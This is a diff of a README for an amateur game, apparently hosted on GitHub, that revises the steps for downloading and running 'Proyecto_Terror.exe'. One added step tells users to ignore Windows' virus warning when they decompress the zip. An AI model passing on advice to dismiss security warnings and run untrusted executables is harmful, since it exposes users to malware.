@@ -92,11 +92,13 @@ Well, i am going to explain you the process to download this videogmae, read qui
 
 >1) First, press the green button with the text "<> Code v".
 
->2) Later, go to "Local" and press "Download Zip"
+>2) Second, go to "Local" and press "Download Zip"
 
->3) Then, put the zip wherever you want in your dispositive(Desk PC, or Laptop)
+>3) Later, put the zip wherever you want in your dispositive(Desk PC, or Laptop)
 
->4) Finally, decompress the full zip, enter to the carpet and execute the archive "Unstable_Anomaly.exe".
+>4) Then, decompress the full zip, ignore the advise of a masked virus from Windows".
+
+>5) Finally, enter to the carpet and execute "Proyecto_Terror.exe".
 
 ## Images
 <img width="975" height="571" alt="WhatsApp Image 2026-06-21 at 4 20 45 PM (10)" src="https://github.com/user-attachments/assets/5c22e534-d224-4668-98c1-e49f4691c13b" />
@@ -119,6 +121,5 @@ Well, i am going to explain you the process to download this videogmae, read qui
 <img width="975" height="566" alt="WhatsApp Image 2026-06-21 at 4 20 45 PM (13)" src="https://github.com/user-attachments/assets/8ee2cd47-5e35-448c-a48b-179e0158b075" />
 <img width="975" height="567" alt="WhatsApp Image 2026-06-21 at 4 20 45 PM (12)" src="https://github.com/user-attachments/assets/4e1db8e1-0ffa-447d-ac83-4c51d0f85cbc" />
 <img width="975" height="563" alt="WhatsApp Image 2026-06-21 at 4 20 45 PM (11)" src="https://github.com/user-attachments/assets/ea05fe94-cb8b-47d5-803f-90eda14e6119" />
-
 
 ## Link of the video
